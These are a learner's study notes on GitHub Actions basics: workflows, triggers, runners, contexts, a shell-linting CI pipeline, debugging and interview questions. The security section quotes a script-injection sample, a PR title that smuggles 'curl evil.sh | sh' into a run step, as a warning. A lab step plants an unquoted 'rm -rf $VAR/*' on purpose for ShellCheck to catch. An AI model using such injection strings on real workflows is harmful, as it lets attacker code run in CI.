# Notes: Day 3 - GitHub Actions Basics

**Week 3 | Wednesday** | Topic: workflows, events, jobs, steps, runners, and a first CI pipeline

---

## 1. What is CI, and what is GitHub Actions?
- **CI (Continuous Integration):** every time someone pushes code, a robot automatically **builds, lints and tests** it, so mistakes are found in minutes, not weeks.
- **CD (Continuous Delivery / Deployment):** the same robot can also **release or deploy** the code (Sunday and Week 5).
- **GitHub Actions** is GitHub's built-in automation. I describe the steps in a **YAML file** inside my repository, and GitHub runs them on a temporary virtual machine.

Why it matters: it gives every pull request a green tick or a red cross (Day 2's PR flow), and it is the first thing recruiters ask about in DevOps interviews.

---

## 2. The Vocabulary (learn these 6 words)

| Word | Meaning | Example |
|---|---|---|
| **Workflow** | One automation file | `.github/workflows/ci.yml` |
| **Event** (trigger) | What starts it | `push`, `pull_request`, `schedule` |
| **Job** | A group of steps that run on **one machine** | `lint-scripts` |
| **Step** | One task inside a job: a shell command or an action | `run: bash -n script.sh` |
| **Action** | A reusable step written by someone else | `uses: actions/checkout@v7` |
| **Runner** | The machine that runs a job | `ubuntu-latest` |

```
Event (push)  -->  Workflow (ci.yml)
                      |-- Job A  (runs on its own runner) --> step 1, step 2, step 3
                      |-- Job B  (own runner, runs after A if "needs: A") --> step 1, step 2
```
- Jobs run **in parallel** by default; `needs:` makes one wait for another.
- Every job starts on a **fresh, empty machine**. Files and variables are **not** shared between jobs (artifacts, Thursday).
- The workflow file **must** be in `.github/workflows/` in the repo root (`.yml` or `.yaml`).

---

## 3. YAML in Five Minutes

```yaml
name: Demo                     # key: value  (a map)
on: push                       # the key "on" starts the triggers
jobs:
  build:                       # indentation = 2 spaces (NEVER tabs)
    runs-on: ubuntu-latest
    steps:                     # a list: each item starts with "- "
      - name: First
        run: echo "hi"
      - name: Second (many lines)
        run: |                 # "|" keeps line breaks, good for several commands
          echo "line one"
          echo "line two"
```
**Gotchas that break workflows**
| Mistake | Problem | Fix |
|---|---|---|
| Tabs for indentation | Parse error | Use spaces |
| Wrong indentation | A key ends up in the wrong place | Compare with a working file |
| `run: echo "Careful: this"` | `: ` inside an unquoted value looks like a new key | Quote the whole value, or use `run: \|` |
| `python-version: 3.10` | Read as the number `3.1` | Quote it: `'3.10'` |
| `on: [push, pull_request]` typed as `On:` | Keys are case sensitive | Use lowercase |
| `yes`, `no`, `on`, `off` as values | Some parsers turn them into booleans | Quote them |

Real error from my own file (caught by `actionlint` and `yamllint` before I ever pushed):
```
triggers-demo.yml:62:26: could not parse as YAML: mapping values are not allowed in this context
   |
62 |       - run: echo "Careful: a manual run for prod"
```

---

## 4. Anatomy of a Workflow (my `hello.yml`)

```yaml
name: Hello Actions                  # name shown in the Actions tab

on:                                  # EVENTS
  push:
  workflow_dispatch:                 # "Run workflow" button

permissions:
  contents: read                     # least privilege for the built-in token

jobs:
  hello:
    runs-on: ubuntu-latest           # fresh Linux VM
    timeout-minutes: 5               # stop stuck jobs
    steps:
      - uses: actions/checkout@v7    # get my code onto the runner
      - name: Look at the runner
        run: |
          uname -a
          nproc
      - name: Use contexts
        env:
          REF: ${{ github.ref_name }}
        run: echo "branch=$REF"
```

**Important:** a runner starts **empty**. Without `actions/checkout`, my files are not there.

---

## 5. Triggers (Events)

```yaml
on:
  push:
    branches: [main]                 # only these branches
    tags: ['v*']                     # or tags like v1.2.0
    paths: ['week-0*/**']            # only when these files change
  pull_request:
    branches: [main]
    types: [opened, synchronize, reopened]
  workflow_dispatch:                 # manual, with optional inputs
    inputs:
      environment: { type: choice, options: [dev, prod], default: dev }
  schedule:
    - cron: '0 3 * * 1'              # Mondays 03:00 UTC
  workflow_call:                     # called by another workflow (Friday)
```

| Event | Runs when | Notes |
|---|---|---|
| `push` | Commits are pushed | Filter with `branches`, `tags`, `paths` |
| `pull_request` | A PR is opened or updated | Runs on a **merge preview** of the PR and `main` |
| `workflow_dispatch` | I click "Run workflow" or call `gh workflow run` | The file must exist on the **default branch** to show the button |
| `schedule` | A cron time | **UTC**, default branch only, can be delayed; in public repos disabled after 60 days without activity |
| `release` | A release is published | Useful for publishing |
| `workflow_call` | Another workflow calls it | Reusable workflows |

**Safe by default:** for pull requests from **forks**, the token is read-only and **secrets are not available**. `pull_request_target` runs with more power, so I never check out and run untrusted PR code there.

**Cron reminder:** `minute hour day month weekday`, same as Linux cron (Week 1), but always **UTC**.

---

## 6. Jobs and Steps in Detail

### Job settings
| Setting | Meaning |
|---|---|
| `runs-on` | Which runner |
| `needs: [a, b]` | Wait for jobs `a` and `b` to succeed |
| `if:` | Run only when true, e.g. `github.event_name == 'pull_request'` |
| `timeout-minutes` | Hard limit |
| `strategy.matrix` | Run the job many times with different values (Thursday) |
| `outputs` | Pass values to later jobs |
| `permissions` | Token rights for this job |
| `env` | Environment variables for all steps |
| `defaults.run.shell` / `working-directory` | Defaults for `run` steps |

### Step settings
| Setting | Meaning |
|---|---|
| `name` | Label in the logs |
| `run` | Shell commands (bash on Linux by default) |
| `uses` | Run an action: `owner/repo@version` |
| `with` | Inputs for an action |
| `env` | Variables for this step |
| `id` | Name to read this step's outputs |
| `if` | Condition, e.g. `if: failure()` |
| `continue-on-error` | Don't fail the job if this step fails |

**A failing command fails the step, and a failed step stops the job** (later steps are skipped unless they have `if: always()` or `if: failure()`). Exit code 0 means success, anything else fails, the same rule as Week 1.

---

## 7. Runners

| Type | What it is |
|---|---|
| **GitHub-hosted** | A fresh VM per job, managed by GitHub, thrown away afterwards |
| **Self-hosted** | My own machine or server runs the jobs |

Common labels: `ubuntu-latest`, `ubuntu-24.04`, `ubuntu-22.04`, `windows-latest`, `macos-latest`. `latest` can change to a newer OS version over time, so pin a version when stability matters (`ubuntu-24.04`).

- Hosted Linux runners already include Git, Docker, Python, Node, the AWS CLI and many tools (see the "runner images" documentation for the exact list).
- Public repositories get free runner minutes. Private repositories get a monthly allowance that depends on the plan, so check the current billing page.
- **Self-hosted runners:** useful for private networks or special hardware, but they are **not** wiped clean automatically, and they must never run code from untrusted public pull requests.

---

## 8. Contexts, Expressions and Variables

Use `${{ ... }}` to read values:

| Expression | Value |
|---|---|
| `${{ github.sha }}` | The commit hash |
| `${{ github.ref_name }}` | Branch or tag name |
| `${{ github.actor }}` | Who started it |
| `${{ github.event_name }}` | `push`, `pull_request` ... |
| `${{ github.repository }}` | `owner/repo` |
| `${{ runner.os }}` | `Linux` |
| `${{ env.NAME }}` | An env variable |
| `${{ secrets.NAME }}` | A secret (Thursday) |
| `${{ steps.<id>.outputs.<name> }}` | Output of an earlier step |
| `${{ needs.<job>.result }}` | `success`, `failure`, `skipped` |

Functions and conditions: `contains()`, `startsWith()`, `success()`, `failure()`, `always()`, `cancelled()`.
```yaml
if: github.ref == 'refs/heads/main' && github.event_name == 'push'
if: ${{ failure() }}
```

### Passing data inside a job (special files)
```bash
echo "version=1.2.3" >> "$GITHUB_OUTPUT"          # a step output: steps.<id>.outputs.version
echo "MODE=fast"     >> "$GITHUB_ENV"             # an env variable for LATER steps
echo "$HOME/bin"     >> "$GITHUB_PATH"            # add to PATH for later steps
echo "## Result: OK" >> "$GITHUB_STEP_SUMMARY"    # a markdown page on the run's summary
```
Log commands:
```bash
echo "::group::Install tools"      # collapsible group
echo "::endgroup::"
echo "::warning file=app.sh,line=3::Check this line"
echo "::error file=app.sh,line=3::This is broken"     # shows as an annotation on the PR
echo "::add-mask::$MY_VALUE"                           # hide a value in the logs
```

---

## 9. Security Basics (do these from day one)

| Rule | Why |
|---|---|
| Set `permissions: contents: read` at the top | The default token may be too powerful |
| **Never put untrusted text inside `run:`** like `${{ github.event.pull_request.title }}` or `${{ github.head_ref }}` | **Script injection**: a branch or PR title like `"; curl evil.sh \| sh #` becomes a command. Pass it through `env:` and use `"$VAR"` |
| Pin actions to a version, ideally a **full commit SHA** for third-party actions | A moved tag could change code under me |
| Prefer official actions (`actions/*`) and well-known publishers | Supply-chain risk |
| Keep secrets in **Secrets**, never in the YAML or the logs | Anyone can read the repo's history |
| Keep Dependabot enabled for `github-actions` | It opens PRs to update action versions |
| Don't run self-hosted runners on public repos | Strangers could run code on my machine |

**Safe vs unsafe**
```yaml
# UNSAFE: the title is pasted into the script text
- run: echo "${{ github.event.pull_request.title }}"

# SAFE: the title is a plain environment variable
- env:
    TITLE: ${{ github.event.pull_request.title }}
  run: echo "$TITLE"
```
`actionlint` catches this for me. Real warning from my test file:
```
"github.event.pull_request.title" is potentially untrusted. avoid using it directly in inline scripts.
instead, pass it through an environment variable.
```

**Versions:** at the time of writing, `actions/checkout` was on major version **7** (earlier I would have used `@v4`). Action versions move quickly, so check each action's **Releases** page, and let **Dependabot** keep them current:
```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: github-actions
    directory: /
    schedule:
      interval: weekly
```

---

## 10. My CI Workflow (`workflows/ci.yml`)

| Job | Runs when | What it does |
|---|---|---|
| `lint-scripts` | push and PR | `bash -n` on every `.sh` file, then **ShellCheck** |
| `test-scripts` | after `lint-scripts` passes (`needs`) | Checks that `cidr.sh` gives the right answer for a /26 (network `.128`, broadcast `.191`, 62 hosts), exits with code 2 for bad input, and that `commit_lint.sh` accepts good and rejects bad messages |
| `commit-messages` | **pull requests only** (`if:`) | `commit_lint.sh --range base..head` using `fetch-depth: 0` so the PR's commits exist on the runner |
| `summary` | always (`if: always()`) | Writes a result table to the run summary |

Extra settings I used: `concurrency` (a new push **cancels** the older run of the same branch), `timeout-minutes`, `permissions: contents: read`, and values passed through `env:` instead of pasted into scripts.

To use it in DevOps-Trip:
```bash
mkdir -p .github/workflows
cp week-03-git-github-actions/3-wed/workflows/ci.yml .github/workflows/ci.yml
git add .github && git commit -m "ci: add shell lint and script tests" && git push
```
Then open the repo's **Actions** tab. The paths in the file match the DevOps-Trip folder layout.

**What CI found in my own repo:** ShellCheck, run over all my 23 scripts, reported one real warning in `git_playground.sh` (`HEAD^{tree}` needs quotes). I fixed it, and all scripts then passed `--severity=warning`. That is exactly what CI is for.

---

## 11. Check Before You Push (`ci_local.sh`)

CI feedback takes a minute or two. Running the same checks locally takes seconds:
```bash
./ci_local.sh                  # lint, workflow validation, script tests
./ci_local.sh origin/main      # also checks commit messages since origin/main
```
It runs `bash -n`, ShellCheck, `actionlint`, `yamllint`, the same script tests as the workflow, and `commit_lint.sh --range`.

Real results from my tests:
| Situation | Result |
|---|---|
| Clean repo | all checks passed |
| A commit named `added stuff` on the branch | `FAIL added stuff` and exit code 1 |
| A script with a missing `fi` | `bash -n` and ShellCheck both failed |
| `needs: lnt-scripts` (typo) | `job "test-scripts" needs job "lnt-scripts" which does not exist` |

Install the tools:
```bash
sudo apt install shellcheck yamllint -y
# actionlint: download from https://github.com/rhysd/actionlint/releases (single binary)
```
`act` can run workflows locally in Docker, but it needs Docker and does not behave exactly like GitHub.

---

## 12. Reading and Debugging Runs

```
Repository -> Actions tab -> pick the run -> pick the job -> click a step to read its log
```
| Action | How |
|---|---|
| Re-run only the failed jobs | "Re-run failed jobs" button, or `gh run rerun <id> --failed` |
| More detail | Re-run with "Enable debug logging" (or the secret `ACTIONS_STEP_DEBUG=true`) |
| Print what the shell does | Add `set -x` at the top of a `run:` block |
| See the context values | `echo "$GITHUB_REF $GITHUB_EVENT_NAME $RUNNER_OS"` |
| Download files from a run | Artifacts (Thursday) |

**gh CLI**
```bash
gh workflow list
gh workflow run ci.yml                  # manual run (needs workflow_dispatch)
gh run list --limit 5
gh run watch                            # follow the run live
gh run view <id> --log-failed           # only the logs of failed steps
gh run rerun <id> --failed
```

### "My workflow does not start" checklist
| Check | Fix |
|---|---|
| File is not in `.github/workflows/` exactly | Move it; the folder name starts with a dot |
| YAML is invalid | The Actions tab shows an error; run `actionlint` |
| Branch or `paths:` filter does not match | Compare with the branch I pushed and the files I changed |
| `workflow_dispatch` or `schedule` | The file must be on the **default branch** |
| Commit message contains `[skip ci]` | Remove it |
| Actions are disabled in Settings | Enable them |
| First PR from a new contributor on a public repo | A maintainer must approve the run |

---

## 13. Lab (Hands-on)

**Part 1: my first workflow**
```bash
cd ~/DevOps-Trip
mkdir -p .github/workflows
cp week-03-git-github-actions/3-wed/workflows/hello.yml .github/workflows/
git add .github && git commit -m "ci: add hello workflow" && git push
```
Open **Actions**, click the run, read each step's log, and open the **Summary** page.
Then run it manually: **Actions -> Hello Actions -> Run workflow** (or `gh workflow run hello.yml`).

**Part 2: the CI pipeline**
```bash
cp week-03-git-github-actions/3-wed/workflows/ci.yml .github/workflows/
./week-03-git-github-actions/3-wed/ci_local.sh          # run the checks locally first
git add .github && git commit -m "ci: add shell lint and script tests" && git push
```

**Part 3: make it fail on purpose, then fix it**
1. Create a branch, add a script with a mistake (an unquoted `$VAR` in `rm -rf $VAR/*`, or a missing `fi`), open a PR.
2. Watch the red cross, open the failing step, read the ShellCheck message, fix it, push, and watch it turn green.
3. Make a commit named `added stuff` and watch the `commit-messages` job fail.
4. Break the YAML (wrong indentation) and read the error on the Actions tab. Then run `actionlint` to see it locally.

**Part 4: triggers**
```bash
cp week-03-git-github-actions/3-wed/workflows/triggers-demo.yml .github/workflows/
```
Run it manually and pick `prod`, push a change inside a `week-0*` folder, then push a change to a file outside it and see that it does not trigger. Delete the file afterwards.

Result: (write what happened, add screenshots of the green run, a red run and the summary page)

---

## 14. Errors Faced Today
- Example: `./deploy.sh: Permission denied` (exit code 126) in CI, although it works on my laptop
- Cause: the script was committed **without the executable bit** (mode `100644`)
- Fix: `git update-index --chmod=+x deploy.sh`, commit and push (or run it as `bash deploy.sh`)
- Second one I hit: `mapping values are not allowed in this context` (an unquoted `: ` inside a YAML value)

Full story: `troubleshooting/error-01.md`

---

## 15. Quick Q&A (for interviews)

**Q: What is GitHub Actions?**
GitHub's built-in CI/CD service. I describe automation in YAML files in `.github/workflows/`, and GitHub runs them on runners when events like a push or pull request happen.

**Q: Workflow vs job vs step?**
A workflow is one YAML file. It contains jobs, which run on separate runners (in parallel unless `needs` is used). A job contains steps, which run in order on the same runner.

**Q: What is a runner?**
The machine that executes a job: a GitHub-hosted VM that is created fresh and destroyed afterwards, or a self-hosted machine I manage.

**Q: What does `actions/checkout` do, and why do I need it?**
It copies my repository onto the runner. A runner starts empty, so without it my files are not there.

**Q: How do you make one job wait for another?**
`needs: other-job`. Without it, jobs run in parallel.

**Q: How do you run a workflow only for pull requests, or only on main?**
Use trigger filters (`on.pull_request.branches`, `on.push.branches`) and `if:` conditions such as `github.event_name == 'pull_request'`.

**Q: Why does my workflow not start?**
Check the file location, valid YAML, branch and path filters, that scheduled and manual workflows are on the default branch, and that Actions are enabled.

**Q: What is script injection in Actions and how do you prevent it?**
Putting untrusted values such as a PR title or branch name directly into a `run:` script lets an attacker run commands. I pass them through `env:` and use them as quoted shell variables.

**Q: How do you secure a workflow?**
Least-privilege `permissions`, no untrusted input inside scripts, secrets in GitHub Secrets, pinned and trusted actions (a full SHA for third-party ones), Dependabot for updates, and no self-hosted runners on public repos.

**Q: Why use `concurrency` in CI?**
So a newer push cancels the older run of the same branch, which saves time and runner minutes.

**Q: How do you debug a failing run?**
Open the failing step's log, re-run failed jobs with debug logging, add `set -x`, and reproduce the commands locally. I also run the same checks locally with a script before pushing.

**Q: Why does `./script.sh` give "Permission denied" in CI?**
The file was committed without the executable bit (mode 100644). Fix it with `git update-index --chmod=+x script.sh` and commit.

**Q: Cron in `schedule:` vs Linux cron?**
Same five-field syntax, but GitHub's schedule always uses **UTC**, may be delayed, and only runs from the default branch.

---

## 16. Summary in 3 lines
1. A workflow (YAML in `.github/workflows/`) runs jobs on fresh runners when an event happens; jobs run in parallel unless `needs:`, steps run in order, and a runner starts empty so `actions/checkout` comes first.
2. A good first CI pipeline lints scripts (`bash -n`, ShellCheck), runs small tests, checks commit messages on pull requests, and uses `permissions`, `concurrency` and `timeout-minutes`.
3. Validate locally with `actionlint`, `yamllint` and `ci_local.sh`, never paste untrusted input into `run:`, and fix "Permission denied" with `git update-index --chmod=+x`.